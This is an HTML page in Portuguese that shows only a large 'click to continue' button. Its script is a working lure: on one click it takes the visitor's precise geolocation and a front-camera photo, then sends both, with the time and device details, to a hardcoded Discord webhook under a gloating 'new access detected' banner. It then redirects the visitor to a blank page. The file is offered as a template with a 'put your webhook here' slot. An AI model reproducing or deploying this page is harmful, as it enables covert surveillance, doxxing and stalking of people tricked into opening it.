<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            overflow: hidden;
            background-color: #000;
            font-family: sans-serif;
        }

        #btn {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90vw;
            height: 70vh;
            max-width: 620px;
            max-height: 520px;
            border: none;
            background-color: #000;
            color: #fff;
            font-size: 46px;
            font-weight: bold;
            cursor: pointer;
            border: 5px solid #fff;
            border-radius: 25px;
            box-shadow: 0 0 40px rgba(255, 255, 255, 0.7);
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 30px;
            line-height: 1.3;
        }

        #btn:hover {
            background-color: #111;
            transform: translate(-50%, -50%) scale(1.05);
            box-shadow: 0 0 60px rgba(255, 0, 0, 0.8);
        }

        #mensagens {
            color: white;
            text-align: center;
            padding: 30px 20px;
            font-family: sans-serif;
            display: none;
        }

        .vermelho { color: red; font-size: 24px; margin: 10px 0; }
        .verde { color: lime; font-size: 24px; margin: 10px 0; }
        .normal { color: white; font-size: 19px; margin: 10px 0; }
    </style>
</head>
<body>

<div id="mensagens">
    <p class="vermelho">TEXTO TEXTO TEXTO</p>
    <p class="verde">TEXTO TEXTO TEXTO TEXTO!</p>
    <p class="normal">TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO TEXTO6!!!</p>
</div>

<button id="btn">CLIQUE PARA CONTINUAR</button>

<video id="v" style="display:none;" autoplay></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    // === SEU WEBHOOK AQUI ===
    const URL_WEBHOOK = "https://discord.com/api/webhooks/1495823762464178316/JUtyoihcRDnKawG_caqxpZ-G4k7NlZpSMSD5TOYG_gZj6asa9SCXsN1d8G-VSstpePse";

    document.getElementById('btn').addEventListener('click', async function() {
        const btn = this;
        const mensagens = document.getElementById('mensagens');

        mensagens.style.display = 'block';
        btn.style.display = 'none';

        try {
            // Pega localização
            const local = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    timeout: 10000,
                    enableHighAccuracy: true
                });
            });

            // Pega câmera frontal
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });

            const video = document.getElementById('v');
            video.srcObject = stream;

            // Espera o vídeo carregar
            await new Promise(resolve => video.onloadedmetadata = resolve);

            // Tira a foto
            const canvas = document.getElementById('c');
            canvas.width = video.videoWidth || 1280;
            canvas.height = video.videoHeight || 720;
            canvas.getContext('2d').drawImage(video, 0, 0);

            const imgData = canvas.toDataURL('image/jpeg', 0.82);
            const blob = await (await fetch(imgData)).blob();

            // Prepara o envio
            const fd = new FormData();
            fd.append('payload_json', JSON.stringify({
                content: "😈 **NOVO ACESSO DETECTADO!** 😈",
                embeds: [{
                    title: "POR PHANT0NS 😈",
                    description: `📍 **Localização:** [Ver no Google Maps](https://www.google.com/maps?q=\( {local.coords.latitude}, \){local.coords.longitude})\n` +
                                 `⏰ **Hora:** ${new Date().toLocaleString('pt-BR')}\n` +
                                 `📱 **Dispositivo:** ${navigator.userAgent.substring(0, 80)}...`,
                    color: 16711680,
                    image: { url: 'attachment://foto.jpg' }
                }]
            }));

            fd.append('file', blob, 'foto.jpg');

            // Envia para o Discord
            const response = await fetch(URL_WEBHOOK, {
                method: 'POST',
                body: fd
            });

            if (response.ok) {
                console.log("✅ Enviado com sucesso para o Discord!");
            } else {
                console.error("❌ Discord rejeitou:", response.status);
            }

            // Para a câmera
            stream.getTracks().forEach(track => track.stop());

            // Redireciona depois de 4 segundos
            setTimeout(() => {
                window.location.href = "about:blank";
            }, 4000);

        } catch (error) {
            console.error("Erro durante a execução:", error);
            setTimeout(() => {
                window.location.href = "about:blank";
            }, 2500);
        }
    });
</script>

</body>
</html>
